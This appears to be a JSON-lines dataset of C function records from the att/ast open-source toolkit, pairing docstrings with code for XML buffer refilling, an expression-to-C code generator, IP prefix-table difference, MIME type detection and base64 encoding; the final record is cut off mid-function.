{"docstring": "/*\n * refill the input buffer and return the next char, -1 on error\n */\n", "func_signal": "static int\nrefill(Dssfile_t* file, register File_t* f, int c, Dssdisc_t* disc)", "code": "{\n\tsize_t\tn;\n\n\tif (f->cur >= f->end)\n\t{\n\t\tif (f->rec)\n\t\t{\n\t\t\tif ((n = f->cur - f->rec + f->prvlen) > f->prvsize)\n\t\t\t{\n\t\t\t\tf->prvsize = roundof(f->prvsize + n, 1024);\n\t\t\t\tif (!(f->prv = vmnewof(file->vm, f->prv, unsigned char, f->prvsize, 0)))\n\t\t\t\t{\n\t\t\t\t\tif (disc->errorf)\n\t\t\t\t\t\t(*disc->errorf)(NiL, disc, ERROR_SYSTEM|2, \"out of space\");\n\t\t\t\t\treturn -1;\n\t\t\t\t}\n\t\t\t}\n\t\t\tif (n > 1)\n\t\t\t\tmemcpy(f->prv + f->prvlen, f->rec, n - 1);\n\t\t\tf->prv[n-1] = f->save;\n\t\t\tf->prvlen += n;\n\t\t}\n\t\tif (!(f->buf = (unsigned char*)sfreserve(file->io, SF_UNBOUND, 0)))\n\t\t\treturn -1;\n\t\tif (f->rec)\n\t\t\tf->rec = f->buf;\n\t\tf->cur = f->buf;\n\t\tc = f->save;\n\t\tf->end = f->buf + sfvalue(file->io) - 1;\n\t\tf->save = *f->end;\n\t\t*f->end = 0;\n\t}\n\treturn c;\n}", "path": "ast/src/cmd/dsslib/xml/xml.c", "commit_date": "2016-01-11 00:00:00", "repo_name": "att/ast", "stars": 522, "license": "epl-1.0", "language": "c", "size": 45884}
{"docstring": "/*\n * generate printf()\n */\n", "func_signal": "static void\nprint(Excc_t* cc, Exnode_t* expr)", "code": "{\n\tregister Print_t*\tx;\n\tregister int\t\ti;\n\n\tif (x = expr->data.print.args)\n\t{\n\t\tsfprintf(cc->ccdisc->text, \"sfprintf(%s, \\\"%s\", expr->data.print.descriptor->op == CONSTANT && expr->data.print.descriptor->data.constant.value.integer == 2 ? \"sfstderr\" : \"sfstdout\", fmtesq(x->format, quote));\n\t\twhile (x = x->next)\n\t\t\tsfprintf(cc->ccdisc->text, \"%s\", fmtesq(x->format, quote));\n\t\tsfprintf(cc->ccdisc->text, \"\\\"\");\n\t\tfor (x = expr->data.print.args; x; x = x->next)\n\t\t{\n\t\t\tif (x->arg)\n\t\t\t{\n\t\t\t\tfor (i = 0; i < elementsof(x->param) && x->param[i]; i++)\n\t\t\t\t{\n\t\t\t\t\tsfprintf(cc->ccdisc->text, \", (\");\n\t\t\t\t\tgen(cc, x->param[i]);\n\t\t\t\t\tsfprintf(cc->ccdisc->text, \")\");\n\t\t\t\t}\n\t\t\t\tsfprintf(cc->ccdisc->text, \", (\");\n\t\t\t\tgen(cc, x->arg);\n\t\t\t\tsfprintf(cc->ccdisc->text, \")\");\n\t\t\t}\n\t\t}\n\t\tsfprintf(cc->ccdisc->text, \");\\n\");\n\t}\n}", "path": "ast/src/lib/libexpr/excc.c", "commit_date": "2016-01-11 00:00:00", "repo_name": "att/ast", "stars": 522, "license": "epl-1.0", "language": "c", "size": 45884}
{"docstring": "/*\n * return the table difference of a and b\n */\n", "func_signal": "Pt_t*\nptdifference(Pt_t* a, Pt_t* b)", "code": "{\n\tPt_t*\tt;\n\tPtprefix_t*\tap;\n\tPtprefix_t*\tbp;\n\tPtaddr_t\tm;\n\n\tif (!(t = ptopen(a->disc)))\n\t\treturn 0;\n\tm = 0;\n\tap = (Ptprefix_t*)dtfirst(a->dict);\n\tbp = (Ptprefix_t*)dtfirst(b->dict);\n\twhile (ap)\n\t{\n\t\tif (!bp || ap->max < bp->min)\n\t\t{\n\t\t\tif (!ptinsert(t, ap->min, ap->max))\n\t\t\t\tbreak;\n\t\t\tap = (Ptprefix_t*)dtnext(a->dict, ap);\n\t\t}\n\t\telse if (ap->min > bp->max)\n\t\t\tbp = (Ptprefix_t*)dtnext(b->dict, bp);\n\t\telse\n\t\t{\n\t\t\tif (ap->min < bp->min && !ptinsert(t, ap->min, bp->min - 1))\n\t\t\t\tbreak;\n\t\t\tif (ap->max < bp->max)\n\t\t\t\tap = (Ptprefix_t*)dtnext(a->dict, ap);\n\t\t\telse if (ap->max == bp->max)\n\t\t\t{\n\t\t\t\tap = (Ptprefix_t*)dtnext(a->dict, ap);\n\t\t\t\tbp = (Ptprefix_t*)dtnext(b->dict, bp);\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\twhile (ap->max > bp->max)\n\t\t\t\t{\n\t\t\t\t\tm = bp->max + 1;\n\t\t\t\t\tif (!(bp = (Ptprefix_t*)dtnext(b->dict, bp)) || bp->min > ap->max)\n\t\t\t\t\t{\n\t\t\t\t\t\tif (!ptinsert(t, m, ap->max))\n\t\t\t\t\t\t\tgoto done;\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\t\tif (bp->min > m && !ptinsert(t, m, bp->min - 1))\n\t\t\t\t\t\tgoto done;\n\t\t\t\t}\n\t\t\t\tap = (Ptprefix_t*)dtnext(a->dict, ap);\n\t\t\t}\n\t\t}\n\t}\n done:\n\treturn t;\n}", "path": "ast/src/cmd/dsslib/ip_t/ptdifference.c", "commit_date": "2016-01-11 00:00:00", "repo_name": "att/ast", "stars": 522, "license": "epl-1.0", "language": "c", "size": 45884}
{"docstring": "/*\n * generate global declarations\n */\n", "func_signal": "static int\nglobal(Dt_t* table, void* object, void* handle)", "code": "{\n\tregister Excc_t*\tcc = (Excc_t*)handle;\n\tregister Exid_t*\tsym = (Exid_t*)object;\n\n\tif (sym->lex == DYNAMIC)\n\t\tsfprintf(cc->ccdisc->text, \"static %s\t%s;\\n\", extype(sym->type), sym->name);\n\treturn 0;\n}", "path": "ast/src/lib/libexpr/excc.c", "commit_date": "2016-01-11 00:00:00", "repo_name": "att/ast", "stars": 522, "license": "epl-1.0", "language": "c", "size": 45884}
{"docstring": "/*\n * close magic handle\n * done this way so that magic is only pulled in\n * if mimetype() is used\n */\n", "func_signal": "static void\ndrop(Mime_t* mp)", "code": "{\n\tif (mp->magic)\n\t{\n\t\tmagicclose(mp->magic);\n\t\tmp->magic = 0;\n\t}\n}", "path": "ast/src/cmd/mailx/port/mimetype.c", "commit_date": "2016-01-11 00:00:00", "repo_name": "att/ast", "stars": 522, "license": "epl-1.0", "language": "c", "size": 45884}
{"docstring": "/*\n * return C name for op\n */\n", "func_signal": "static char*\nopname(int op)", "code": "{\n\tstatic char\tbuf[16];\n\n\tswitch (op)\n\t{\n\tcase '!':\n\t\treturn \"!\";\n\tcase '%':\n\t\treturn \"%\";\n\tcase '&':\n\t\treturn \"&\";\n\tcase '(':\n\t\treturn \"(\";\n\tcase '*':\n\t\treturn \"*\";\n\tcase '+':\n\t\treturn \"+\";\n\tcase ',':\n\t\treturn \",\";\n\tcase '-':\n\t\treturn \"-\";\n\tcase '/':\n\t\treturn \"/\";\n\tcase ':':\n\t\treturn \":\";\n\tcase '<':\n\t\treturn \"<\";\n\tcase '=':\n\t\treturn \"=\";\n\tcase '>':\n\t\treturn \">\";\n\tcase '?':\n\t\treturn \"?\";\n\tcase '^':\n\t\treturn \"^\";\n\tcase '|':\n\t\treturn \"|\";\n\tcase '~':\n\t\treturn \"~\";\n\tcase AND:\n\t\treturn \"&&\";\n\tcase EQ:\n\t\treturn \"==\";\n\tcase GE:\n\t\treturn \">=\";\n\tcase LE:\n\t\treturn \"<=\";\n\tcase LS:\n\t\treturn \"<<\";\n\tcase NE:\n\t\treturn \"!=\";\n\tcase OR:\n\t\treturn \"||\";\n\tcase RS:\n\t\treturn \">>\";\n\t}\n\tsfsprintf(buf, sizeof(buf) - 1, \"(OP=%03o)\", op);\n\treturn buf;\n}", "path": "ast/src/lib/libexpr/excc.c", "commit_date": "2016-01-11 00:00:00", "repo_name": "att/ast", "stars": 522, "license": "epl-1.0", "language": "c", "size": 45884}
{"docstring": "/*\n * dump an expression tree on sp\n */\n", "func_signal": "int\nexdump(Expr_t* expr, Exnode_t* node, Sfio_t* sp)", "code": "{\n\tExcc_t*\t\tcc;\n\tExccdisc_t\tccdisc;\n\tExid_t*\t\tsym;\n\n\tmemset(&ccdisc, 0, sizeof(ccdisc));\n\tccdisc.flags = EX_CC_DUMP;\n\tccdisc.text = sp;\n\tif (!(cc = exccopen(expr, &ccdisc)))\n\t\treturn -1;\n\tif (node)\n\t\tgen(cc, node);\n\telse\n\t\tfor (sym = (Exid_t*)dtfirst(expr->symbols); sym; sym = (Exid_t*)dtnext(expr->symbols, sym))\n\t\t\tif (sym->lex == PROCEDURE && sym->value)\n\t\t\t{\n\t\t\t\tsfprintf(sp, \"%s:\\n\", sym->name);\n\t\t\t\tgen(cc, sym->value->data.procedure.body);\n\t\t\t}\n\tsfprintf(sp, \"\\n\");\n\treturn exccclose(cc);\n}", "path": "ast/src/lib/libexpr/excc.c", "commit_date": "2016-01-11 00:00:00", "repo_name": "att/ast", "stars": 522, "license": "epl-1.0", "language": "c", "size": 45884}
{"docstring": "/*\n * xml fclosef\n */\n", "func_signal": "static int\nxmlfclose(Dssfile_t* file, Dssdisc_t* disc)", "code": "{\n\tif (!file || !file->data)\n\t\treturn -1;\n\treturn 0;\n}", "path": "ast/src/cmd/dsslib/xml/xml.c", "commit_date": "2016-01-11 00:00:00", "repo_name": "att/ast", "stars": 522, "license": "epl-1.0", "language": "c", "size": 45884}
{"docstring": "/*\n * internal excc\n */\n", "func_signal": "static void\ngen(Excc_t* cc, register Exnode_t* expr)", "code": "{\n\tregister Exnode_t*\tx;\n\tregister Exnode_t*\ty;\n\tregister int\t\tn;\n\tregister int\t\tm;\n\tregister int\t\tt;\n\tchar*\t\t\ts;\n\tExtype_t*\t\tv;\n\tExtype_t**\t\tp;\n\n\tif (!expr)\n\t\treturn;\n\tx = expr->data.operand.left;\n\tswitch (expr->op)\n\t{\n\tcase BREAK:\n\t\tsfprintf(cc->ccdisc->text, \"break;\\n\");\n\t\treturn;\n\tcase CONTINUE:\n\t\tsfprintf(cc->ccdisc->text, \"continue;\\n\");\n\t\treturn;\n\tcase CONSTANT:\n\t\tswitch (expr->type)\n\t\t{\n\t\tcase FLOATING:\n\t\t\tsfprintf(cc->ccdisc->text, \"%g\", expr->data.constant.value.floating);\n\t\t\tbreak;\n\t\tcase STRING:\n\t\t\tsfprintf(cc->ccdisc->text, \"\\\"%s\\\"\", fmtesq(expr->data.constant.value.string, quote));\n\t\t\tbreak;\n\t\tcase UNSIGNED:\n\t\t\tsfprintf(cc->ccdisc->text, \"%I*u\", sizeof(expr->data.constant.value.integer), expr->data.constant.value.integer);\n\t\t\tbreak;\n\t\tdefault:\n\t\t\tsfprintf(cc->ccdisc->text, \"%I*d\", sizeof(expr->data.constant.value.integer), expr->data.constant.value.integer);\n\t\t\tbreak;\n\t\t}\n\t\treturn;\n\tcase DEC:\n\t\tsfprintf(cc->ccdisc->text, \"%s--\", x->data.variable.symbol->name);\n\t\treturn;\n\tcase DYNAMIC:\n\t\tsfprintf(cc->ccdisc->text, \"%s\", expr->data.variable.symbol->name);\n\t\treturn;\n\tcase EXIT:\n\t\tsfprintf(cc->ccdisc->text, \"exit(\");\n\t\tgen(cc, x);\n\t\tsfprintf(cc->ccdisc->text, \");\\n\");\n\t\treturn;\n\tcase IF:\n\t\tsfprintf(cc->ccdisc->text, \"if (\");\n\t\tgen(cc, x);\n\t\tsfprintf(cc->ccdisc->text, \") {\\n\");\n\t\tgen(cc, expr->data.operand.right->data.operand.left);\n\t\tif (expr->data.operand.right->data.operand.right)\n\t\t{\n\t\t\tsfprintf(cc->ccdisc->text, \"} else {\\n\");\n\t\t\tgen(cc, expr->data.operand.right->data.operand.right);\n\t\t}\n\t\tsfprintf(cc->ccdisc->text, \"}\\n\");\n\t\treturn;\n\tcase FOR:\n\t\tsfprintf(cc->ccdisc->text, \"for (;\");\n\t\tgen(cc, x);\n\t\tsfprintf(cc->ccdisc->text, \");\");\n\t\tif (expr->data.operand.left)\n\t\t{\n\t\t\tsfprintf(cc->ccdisc->text, \"(\");\n\t\t\tgen(cc, expr->data.operand.left);\n\t\t\tsfprintf(cc->ccdisc->text, \")\");\n\t\t}\n\t\tsfprintf(cc->ccdisc->text, \") {\");\n\t\tif (expr->data.operand.right)\n\t\t\tgen(cc, expr->data.operand.right);\n\t\tsfprintf(cc->ccdisc->text, \"}\");\n\t\treturn;\n\tcase ID:\n\t\tif (cc->ccdisc->ccf)\n\t\t\t(*cc->ccdisc->ccf)(cc, expr, expr->data.variable.symbol, expr->data.variable.reference, expr->data.variable.index, cc->ccdisc);\n\t\telse\n\t\t\tsfprintf(cc->ccdisc->text, \"%s\", expr->data.variable.symbol->name);\n\t\treturn;\n\tcase INC:\n\t\tsfprintf(cc->ccdisc->text, \"%s++\", x->data.variable.symbol->name);\n\t\treturn;\n\tcase ITERATE:\n\t\tif (expr->op == DYNAMIC)\n\t\t{\n\t\t\tsfprintf(cc->ccdisc->text, \"{ Exassoc_t* %stmp_%d;\", cc->id, ++cc->tmp);\n\t\t\tsfprintf(cc->ccdisc->text, \"for (%stmp_%d = (Exassoc_t*)dtfirst(%s); %stmp_%d && (%s = %stmp_%d->name); %stmp_%d = (Exassoc_t*)dtnext(%s, %stmp_%d)) {\", cc->id, cc->tmp, expr->data.generate.array->data.variable.symbol->name, cc->id, cc->tmp, expr->data.generate.index->name, cc->id, cc->tmp, cc->id, cc->tmp, expr->data.generate.array->data.variable.symbol->name, cc->id, cc->tmp);\n\t\t\tgen(cc, expr->data.generate.statement);\n\t\t\tsfprintf(cc->ccdisc->text, \"} }\");\n\t\t}\n\t\treturn;\n\tcase PRINTF:\n\t\tprint(cc, expr);\n\t\treturn;\n\tcase RETURN:\n\t\tsfprintf(cc->ccdisc->text, \"return(\");\n\t\tgen(cc, x);\n\t\tsfprintf(cc->ccdisc->text, \");\\n\");\n\t\treturn;\n\tcase SCANF:\n\t\tscan(cc, expr);\n\t\treturn;\n\tcase SWITCH:\n\t\tt = x->type;\n\t\tsfprintf(cc->ccdisc->text, \"{ %s %stmp_%d = \", extype(t), cc->id, ++cc->tmp);\n\t\tgen(cc, x);\n\t\tsfprintf(cc->ccdisc->text, \";\");\n\t\tx = expr->data.operand.right;\n\t\ty = x->data.select.statement;\n\t\tn = 0;\n\t\twhile (x = x->data.select.next)\n\t\t{\n\t\t\tif (n)\n\t\t\t\tsfprintf(cc->ccdisc->text, \"else \");\n\t\t\tif (!(p = x->data.select.constant))\n\t\t\t\ty = x->data.select.statement;\n\t\t\telse\n\t\t\t{\n\t\t\t\tm = 0;\n\t\t\t\twhile (v = *p++)\n\t\t\t\t{\n\t\t\t\t\tif (m)\n\t\t\t\t\t\tsfprintf(cc->ccdisc->text, \"||\");\n\t\t\t\t\telse\n\t\t\t\t\t{\n\t\t\t\t\t\tm = 1;\n\t\t\t\t\t\tsfprintf(cc->ccdisc->text, \"if (\");\n\t\t\t\t\t}\n\t\t\t\t\tif (t == STRING)\n\t\t\t\t\t\tsfprintf(cc->ccdisc->text, \"strmatch(%stmp_%d, \\\"%s\\\")\", cc->id, cc->tmp, fmtesq(v->string, quote));\n\t\t\t\t\telse\n\t\t\t\t\t{\n\t\t\t\t\t\tsfprintf(cc->ccdisc->text, \"%stmp_%d == \", cc->id, cc->tmp);\n\t\t\t\t\t\tswitch (t)\n\t\t\t\t\t\t{\n\t\t\t\t\t\tcase INTEGER:\n\t\t\t\t\t\tcase UNSIGNED:\n\t\t\t\t\t\t\tsfprintf(cc->ccdisc->text, \"%I*u\", sizeof(v->integer), v->integer);\n\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\tdefault:\n\t\t\t\t\t\t\tsfprintf(cc->ccdisc->text, \"%g\", v->floating);\n\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tsfprintf(cc->ccdisc->text, \") {\");\n\t\t\t\tgen(cc, x->data.select.statement);\n\t\t\t\tsfprintf(cc->ccdisc->text, \"}\");\n\t\t\t}\n\t\t}\n\t\tif (y)\n\t\t{\n\t\t\tif (n)\n\t\t\t\tsfprintf(cc->ccdisc->text, \"else \");\n\t\t\tsfprintf(cc->ccdisc->text, \"{\");\n\t\t\tgen(cc, y);\n\t\t\tsfprintf(cc->ccdisc->text, \"}\");\n\t\t}\n\t\tsfprintf(cc->ccdisc->text, \"}\");\n\t\treturn;\n\tcase WHILE:\n\t\tsfprintf(cc->ccdisc->text, \"while (\");\n\t\tgen(cc, x);\n\t\tsfprintf(cc->ccdisc->text, \") {\");\n\t\tif (expr->data.operand.right)\n\t\t\tgen(cc, expr->data.operand.right);\n\t\tsfprintf(cc->ccdisc->text, \"}\");\n\t\treturn;\n\tcase '=':\n\t\tsfprintf(cc->ccdisc->text, \"(%s%s=\", x->data.variable.symbol->name, expr->subop == '=' ? \"\" : opname(expr->subop));\n\t\tgen(cc, expr->data.operand.right);\n\t\tsfprintf(cc->ccdisc->text, \")\");\n\t\treturn;\n\tcase ';':\n\t\tfor (;;)\n\t\t{\n\t\t\tif (!(x = expr->data.operand.right))\n\t\t\t\tswitch (cc->lastop = expr->data.operand.left->op)\n\t\t\t\t{\n\t\t\t\tcase FOR:\n\t\t\t\tcase IF:\n\t\t\t\tcase PRINTF:\n\t\t\t\tcase RETURN:\n\t\t\t\tcase WHILE:\n\t\t\t\t\tbreak;\n\t\t\t\tdefault:\n\t\t\t\t\tsfprintf(cc->ccdisc->text, \"_%svalue=\", cc->id);\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\tgen(cc, expr->data.operand.left);\n\t\t\tsfprintf(cc->ccdisc->text, \";\\n\");\n\t\t\tif (!(expr = x))\n\t\t\t\tbreak;\n\t\t\tswitch (cc->lastop = expr->op)\n\t\t\t{\n\t\t\tcase ';':\n\t\t\t\tcontinue;\n\t\t\tcase FOR:\n\t\t\tcase IF:\n\t\t\tcase PRINTF:\n\t\t\tcase RETURN:\n\t\t\tcase WHILE:\n\t\t\t\tbreak;\n\t\t\tdefault:\n\t\t\t\tsfprintf(cc->ccdisc->text, \"_%svalue=\", cc->id);\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tgen(cc, expr);\n\t\t\tsfprintf(cc->ccdisc->text, \";\\n\");\n\t\t\tbreak;\n\t\t}\n\t\treturn;\n\tcase ',':\n\t\tsfprintf(cc->ccdisc->text, \"(\");\n\t\tgen(cc, x);\n\t\twhile ((expr = expr->data.operand.right) && expr->op == ',')\n\t\t{\n\t\t\tsfprintf(cc->ccdisc->text, \"), (\");\n\t\t\tgen(cc, expr->data.operand.left);\n\t\t}\n\t\tif (expr)\n\t\t{\n\t\t\tsfprintf(cc->ccdisc->text, \"), (\");\n\t\t\tgen(cc, expr);\n\t\t}\n\t\tsfprintf(cc->ccdisc->text, \")\");\n\t\treturn;\n\tcase '?':\n\t\tsfprintf(cc->ccdisc->text, \"(\");\n\t\tgen(cc, x);\n\t\tsfprintf(cc->ccdisc->text, \") ? (\");\n\t\tgen(cc, expr->data.operand.right->data.operand.left);\n\t\tsfprintf(cc->ccdisc->text, \") : (\");\n\t\tgen(cc, expr->data.operand.right->data.operand.right);\n\t\tsfprintf(cc->ccdisc->text, \")\");\n\t\treturn;\n\tcase AND:\n\t\tsfprintf(cc->ccdisc->text, \"(\");\n\t\tgen(cc, x);\n\t\tsfprintf(cc->ccdisc->text, \") && (\");\n\t\tgen(cc, expr->data.operand.right);\n\t\tsfprintf(cc->ccdisc->text, \")\");\n\t\treturn;\n\tcase OR:\n\t\tsfprintf(cc->ccdisc->text, \"(\");\n\t\tgen(cc, x);\n\t\tsfprintf(cc->ccdisc->text, \") || (\");\n\t\tgen(cc, expr->data.operand.right);\n\t\tsfprintf(cc->ccdisc->text, \")\");\n\t\treturn;\n\tcase F2I:\n\t\tsfprintf(cc->ccdisc->text, \"(%s)(\", extype(INTEGER));\n\t\tgen(cc, x);\n\t\tsfprintf(cc->ccdisc->text, \")\");\n\t\treturn;\n\tcase I2F:\n\t\tsfprintf(cc->ccdisc->text, \"(%s)(\", extype(FLOATING));\n\t\tgen(cc, x);\n\t\tsfprintf(cc->ccdisc->text, \")\");\n\t\treturn;\n\tcase S2I:\n\t\tsfprintf(cc->ccdisc->text, \"strto%s(\", sizeof(intmax_t) > sizeof(long) ? \"ll\" : \"l\");\n\t\tgen(cc, x);\n\t\tsfprintf(cc->ccdisc->text, \",(char**)0,0)\");\n\t\treturn;\n\t}\n\ty = expr->data.operand.right;\n\tif (x->type == STRING)\n\t{\n\t\tswitch (expr->op)\n\t\t{\n\t\tcase S2B:\n\t\t\tsfprintf(cc->ccdisc->text, \"*(\");\n\t\t\tgen(cc, x);\n\t\t\tsfprintf(cc->ccdisc->text, \")!=0\");\n\t\t\treturn;\n\t\tcase S2F:\n\t\t\tsfprintf(cc->ccdisc->text, \"strtod(\");\n\t\t\tgen(cc, x);\n\t\t\tsfprintf(cc->ccdisc->text, \",0)\");\n\t\t\treturn;\n\t\tcase S2I:\n\t\t\tsfprintf(cc->ccdisc->text, \"strtol(\");\n\t\t\tgen(cc, x);\n\t\t\tsfprintf(cc->ccdisc->text, \",0,0)\");\n\t\t\treturn;\n\t\tcase S2X:\n\t\t\tsfprintf(cc->ccdisc->text, \"** cannot convert string value to external **\");\n\t\t\treturn;\n\t\tcase NE:\n\t\t\tsfprintf(cc->ccdisc->text, \"!\");\n\t\t\t/*FALLTHROUGH*/\n\t\tcase EQ:\n\t\t\tsfprintf(cc->ccdisc->text, \"strmatch(\");\n\t\t\tgen(cc, x);\n\t\t\tsfprintf(cc->ccdisc->text, \",\");\n\t\t\tgen(cc, y);\n\t\t\tsfprintf(cc->ccdisc->text, \")\");\n\t\t\treturn;\n\t\tcase '+':\n\t\tcase '|':\n\t\tcase '&':\n\t\tcase '^':\n\t\tcase '%':\n\t\tcase '*':\n\t\t\tsfprintf(cc->ccdisc->text, \"** string bits not supported **\");\n\t\t\treturn;\n\t\t}\n\t\tswitch (expr->op)\n\t\t{\n\t\tcase '<':\n\t\t\ts = \"<0\";\n\t\t\tbreak;\n\t\tcase LE:\n\t\t\ts = \"<=0\";\n\t\t\tbreak;\n\t\tcase GE:\n\t\t\ts = \">=0\";\n\t\t\tbreak;\n\t\tcase '>':\n\t\t\ts = \">0\";\n\t\t\tbreak;\n\t\tdefault:\n\t\t\ts = \"** unknown string op **\";\n\t\t\tbreak;\n\t\t}\n\t\tsfprintf(cc->ccdisc->text, \"strcoll(\");\n\t\tgen(cc, x);\n\t\tsfprintf(cc->ccdisc->text, \",\");\n\t\tgen(cc, y);\n\t\tsfprintf(cc->ccdisc->text, \")%s\", s);\n\t\treturn;\n\t}\n\telse\n\t{\n\t\tif (!y)\n\t\t\tsfprintf(cc->ccdisc->text, \"%s\", opname(expr->op));\n\t\tsfprintf(cc->ccdisc->text, \"(\");\n\t\tgen(cc, x);\n\t\tif (y)\n\t\t{\n\t\t\tsfprintf(cc->ccdisc->text, \")%s(\", opname(expr->op));\n\t\t\tgen(cc, y);\n\t\t}\n\t\tsfprintf(cc->ccdisc->text, \")\");\n\t}\n\treturn;\n}", "path": "ast/src/lib/libexpr/excc.c", "commit_date": "2016-01-11 00:00:00", "repo_name": "att/ast", "stars": 522, "license": "epl-1.0", "language": "c", "size": 45884}
{"docstring": "/*\n * return mime type for file\n */\n", "func_signal": "char*\nmimetype(Mime_t* mp, Sfio_t* fp, const char* file, struct stat* st)", "code": "{\n\tif (mp->disc->flags & MIME_NOMAGIC)\n\t\treturn 0;\n\tif (!mp->magic)\n\t{\n\t\tmp->magicd.version = MAGIC_VERSION;\n\t\tmp->magicd.flags = MAGIC_MIME;\n\t\tmp->magicd.errorf = mp->disc->errorf;\n\t\tif (!(mp->magic = magicopen(&mp->magicd)))\n\t\t{\n\t\t\tmp->disc->flags |= MIME_NOMAGIC;\n\t\t\treturn 0;\n\t\t}\n\t\tmp->freef = drop;\n\t\tmagicload(mp->magic, NiL, 0);\n\t}\n\treturn magictype(mp->magic, fp, file, st);\n}", "path": "ast/src/cmd/mailx/port/mimetype.c", "commit_date": "2016-01-11 00:00:00", "repo_name": "att/ast", "stars": 522, "license": "epl-1.0", "language": "c", "size": 45884}
{"docstring": "/*\n * generate scanf()\n */\n", "func_signal": "static void\nscan(Excc_t* cc, Exnode_t* expr)", "code": "{\n\tregister Print_t*\tx;\n\tregister int\t\ti;\n\n\tif (x = expr->data.print.args)\n\t{\n\t\tsfprintf(cc->ccdisc->text, \"sfscanf(sfstdin, \\\"%s\", fmtesq(x->format, quote));\n\t\twhile (x = x->next)\n\t\t\tsfprintf(cc->ccdisc->text, \"%s\", fmtesq(x->format, quote));\n\t\tsfprintf(cc->ccdisc->text, \"\\\"\");\n\t\tfor (x = expr->data.print.args; x; x = x->next)\n\t\t{\n\t\t\tif (x->arg)\n\t\t\t{\n\t\t\t\tfor (i = 0; i < elementsof(x->param) && x->param[i]; i++)\n\t\t\t\t{\n\t\t\t\t\tsfprintf(cc->ccdisc->text, \", &(\");\n\t\t\t\t\tgen(cc, x->param[i]);\n\t\t\t\t\tsfprintf(cc->ccdisc->text, \")\");\n\t\t\t\t}\n\t\t\t\tsfprintf(cc->ccdisc->text, \", &(\");\n\t\t\t\tgen(cc, x->arg);\n\t\t\t\tsfprintf(cc->ccdisc->text, \")\");\n\t\t\t}\n\t\t}\n\t\tsfprintf(cc->ccdisc->text, \");\\n\");\n\t}\n}", "path": "ast/src/lib/libexpr/excc.c", "commit_date": "2016-01-11 00:00:00", "repo_name": "att/ast", "stars": 522, "license": "epl-1.0", "language": "c", "size": 45884}
{"docstring": "/*\n * generate the program for name or sym coerced to type\n */\n", "func_signal": "int\nexcc(Excc_t* cc, const char* name, Exid_t* sym, int type)", "code": "{\n\tregister char*\tt;\n\n\tif (!cc)\n\t\treturn -1;\n\tif (!sym)\n\t\tsym = name ? (Exid_t*)dtmatch(cc->expr->symbols, name) : &cc->expr->main;\n\tif (sym && sym->lex == PROCEDURE && sym->value)\n\t{\n\t\tt = extype(type);\n\t\tsfprintf(cc->ccdisc->text, \"\\n%s %s%s(data) char** data; {\\n%s _%svalue = 0;\\n\", t, cc->id, sym->name, t, cc->id);\n\t\tgen(cc, sym->value->data.procedure.body);\n\t\tsfprintf(cc->ccdisc->text, \";\\n\");\n\t\tif (cc->lastop != RETURN)\n\t\t\tsfprintf(cc->ccdisc->text, \"return _%svalue;\\n\", cc->id);\n\t\tsfprintf(cc->ccdisc->text, \"}\\n\");\n\t\treturn 0;\n\t}\n\treturn -1;\n}", "path": "ast/src/lib/libexpr/excc.c", "commit_date": "2016-01-11 00:00:00", "repo_name": "att/ast", "stars": 522, "license": "epl-1.0", "language": "c", "size": 45884}
{"docstring": "/*\n * xml writef -- output current record\n */\n", "func_signal": "static int\nxmlwrite(Dssfile_t* file, Dssrecord_t* record, Dssdisc_t* disc)", "code": "{\n\tregister File_t*\tr = (File_t*)record->data;\n\tsize_t\t\t\tn;\n\n\tsfprintf(file->io, \"<%s\", r->root);\n\tif (r->prvlen && sfwrite(file->io, r->prv, r->prvlen) != r->prvlen)\n\t{\n\t\tif (disc->errorf)\n\t\t\t(*disc->errorf)(NiL, disc, ERROR_SYSTEM|2, \"%s: write error\", file->path);\n\t\treturn -1;\n\t}\n\tif ((n = r->cur - r->rec) && sfwrite(file->io, r->rec, n) != n)\n\t{\n\t\tif (disc->errorf)\n\t\t\t(*disc->errorf)(NiL, disc, ERROR_SYSTEM|2, \"%s: write error\", file->path);\n\t\treturn -1;\n\t}\n\tsfputc(file->io, '\\n');\n\treturn 0;\n}", "path": "ast/src/cmd/dsslib/xml/xml.c", "commit_date": "2016-01-11 00:00:00", "repo_name": "att/ast", "stars": 522, "license": "epl-1.0", "language": "c", "size": 45884}
{"docstring": "/*\n * mime base64 encode\n */\n", "func_signal": "ssize_t\nbase64encode(const void* fb, size_t fz, void** fn, void* tb, size_t tz, void** tn)", "code": "{\n\tregister unsigned char*\tfp;\n\tregister unsigned char*\ttp;\n\tregister unsigned char*\tfe;\n\tregister unsigned char*\tte;\n\tregister unsigned char*\ttc;\n\tregister unsigned char*\tm;\n\tregister unsigned long\tb;\n\tsize_t\t\t\tn;\n\tunsigned char\t\ttmp[B64_EC * B64_CHUNK];\n\n\tm = (unsigned char*)alp;\n\tfp = fe = (unsigned char*)fb;\n\tif (fz >= 3)\n\t{\n\t\tn = fz % 3;\n\t\tfe += fz - n;\n\t\tfz = n;\n\t}\n\tif (tp = (unsigned char*)tb)\n\t{\n\t\tte = tp + tz - B64_EC + 1;\n\t\tn = 0;\n\t}\n\telse\n\t{\n\t\tif (fn)\n\t\t\t*fn = fp;\n\t\tif (tn)\n\t\t\t*tn = 0;\n\t\ttp = tmp;\n\t\tte = tp + sizeof(tmp) - B64_EC + 1;\n\t\tn = 1;\n\t}\n\tfor (;;)\n\t{\n\t\ttc = tp + B64_EC * B64_CHUNK;\n\t\tdo\n\t\t{\n\t\t\tif (fp >= fe)\n\t\t\t\tgoto done;\n\t\t\tif (tp >= te)\n\t\t\t{\n\t\t\t\tif (fn)\n\t\t\t\t\t*fn = fp;\n\t\t\t\tif (tn)\n\t\t\t\t\t*tn = tp;\n\t\t\t\tn = tp - (unsigned char*)tb + 1;\n\t\t\t\ttp = tmp;\n\t\t\t\tte = tp + sizeof(tmp) - B64_EC + 1;\n\t\t\t}\n\t\t\tb = *fp++ << 16;\n\t\t\tb |= *fp++ << 8;\n\t\t\tb |= *fp++;\n\t\t\t*tp++ = m[b >> 18];\n\t\t\t*tp++ = m[(b >> 12) & 077];\n\t\t\t*tp++ = m[(b >> 6) & 077];\n\t\t\t*tp++ = m[b & 077];\n\t\t} while (tp < tc);\n\t\tif (n)\n\t\t{\n\t\t\tn += tp - tmp + (fp < 